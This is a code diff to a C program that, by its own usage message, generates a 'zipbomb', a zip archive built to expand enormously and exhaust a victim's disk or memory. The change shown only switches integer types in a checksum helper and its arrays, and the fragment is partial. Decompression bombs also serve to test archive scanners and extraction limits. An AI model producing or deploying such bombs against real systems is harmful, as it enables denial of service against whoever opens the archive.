@@ -10,7 +10,7 @@
 #define Y(x) U(x), x >> 16 & 255, x >> 24 & 255
 #define Z 0, 0, 0, 0
 #define write(...) fprintf(file, __VA_ARGS__)
-int f(long long x[], long long y) {
+int f(unsigned long x[], unsigned long y) {
 	int output = 0;
 	for (char i = 0; i < 33; i++) output ^= x[i] * (y >> i & 1);
 	return output;
@@ -19,7 +19,7 @@ int main(int argc, char *argv[]) {
 	if (argc > 1 && !strcmp(argv[1], "-h")) return printf("Usage: ./zipbomb   [name of output zip]   [number of files]\t  [size in kilobytes of each file]\nDefaults:\t\toutput.zip\t\t1000\t\t\t\t1000\n");
 	FILE *file = fopen(argc > 1 ? argv[1] : "output.zip", "w");
 	unsigned int i, A = S(32) - 1, B = T(2), C = T(3), F = C * 1032 + 1, H = F;
-	long long D[33], d[33], E[8], G[33], g[33];
+	unsigned long D[33], d[33], E[8], G[33], g[33];
 	for (i = 0; i < 33; i++) D[i] = S(i);
 	for (i = 0; i < 8; i++) {
 		E[i] = 0;
